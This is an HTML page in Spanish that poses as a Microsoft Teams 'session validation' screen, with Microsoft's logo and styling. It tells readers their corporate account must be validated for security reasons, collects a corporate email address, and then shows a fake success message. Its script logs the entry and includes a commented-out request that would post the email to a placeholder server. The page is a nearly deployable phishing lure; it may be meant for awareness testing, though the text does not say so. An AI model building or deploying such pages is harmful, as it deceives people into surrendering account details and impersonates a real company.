<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Validación de Cuenta</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f3f2f1;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 400px;
            margin: 100px auto;
            background: white;
            padding: 30px;
            border-radius: 6px;
            box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 120px;
        }

        h2 {
            text-align: center;
            color: #333;
        }

        p {
            font-size: 14px;
            color: #555;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-top: 10px;
            border-radius: 4px;
            border: 1px solid #ccc;
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 20px;
            background-color: #0078D4;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background-color: #005ea6;
        }

        .hidden {
            display: none;
        }

        .success {
            text-align: center;
            color: green;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
    </div>

    <h2>Validación de sesión</h2>

    <p>
        Por motivos de seguridad, se requiere validar su cuenta corporativa para continuar usando Microsoft Teams.
    </p>

    <form id="loginForm">
        <label>Correo corporativo</label>
        <input type="email" id="email" placeholder="usuario@akiseat.com" required>

        <button type="submit">Validar</button>
    </form>

    <div id="successMessage" class="success hidden">
        ✔ Validación completada correctamente.<br><br>
        Puede cerrar esta ventana.
    </div>
</div>

<script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
        event.preventDefault();

        var email = document.getElementById("email").value;

        console.log("Usuario ingresó:", email);

        // Aquí podrías enviar datos a un log interno si quieres
        // fetch("tu_servidor/log.php", {method:"POST", body:email});

        document.getElementById("loginForm").classList.add("hidden");
        document.getElementById("successMessage").classList.remove("hidden");
    });
</script>

</body>
</html>
